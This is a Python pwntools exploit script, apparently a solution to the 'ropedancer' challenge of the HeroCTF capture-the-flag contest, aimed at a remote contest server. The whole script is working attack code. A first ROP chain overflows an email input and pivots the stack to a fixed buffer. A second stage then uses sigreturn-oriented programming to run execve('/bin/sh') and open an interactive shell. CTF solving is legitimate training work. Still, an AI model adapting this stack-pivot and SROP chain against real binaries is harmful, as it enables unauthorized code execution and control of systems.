from pwn import *

context.binary = ELF("./ropedancer")

# r = process("./ropedancer")
r = remote("static-03.heroctf.fr", 5002)

r.sendlineafter(b"be a ROPedancer? ", b"yes")

# Gadgets
mov_rsp_rbp_pop_rbp = 0x401114 # mov rsp, rbp ; pop rbp ; ret
pop_rbp             = 0x401117 # pop rbp ; ret
xor_rax_inc_al      = 0x401011 # xor eax, eax ; inc al ; ret
inc_al              = 0x401013 # inc al ; ret
syscall             = 0x40102f # syscall
motivation_letter   = 0x40312C

# 16 + 8 (rbp save) = 24 characters
rop1 = b'our.fake.email@gmail.com'

# Stack pivot to motivation_letter
rop1 += p64(pop_rbp)
rop1 += p64(motivation_letter)

rop1 += p64(mov_rsp_rbp_pop_rbp)
rop1 += p64(motivation_letter)

log.success(f"1st ROP length: {len(rop1)}")
r.sendlineafter(b"contact you: ", rop1)

###########################################

srop_frame = SigreturnFrame()
srop_frame.rax = constants.SYS_execve
srop_frame.rdi = motivation_letter
srop_frame.rsi = 0
srop_frame.rdx = 0
srop_frame.rip = syscall

# SYS_SIGRETURN (rax=0xf)
rop2 = b"/bin/sh\x00"
rop2 += p64(xor_rax_inc_al)
rop2 += p64(inc_al) * 0xe
rop2 += p64(syscall)
rop2 += bytes(srop_frame)

print(srop_frame.keys())

log.success(f"2nd ROP length: {len(rop2)}")
r.sendlineafter(b"hire you: ", rop2)
r.interactive()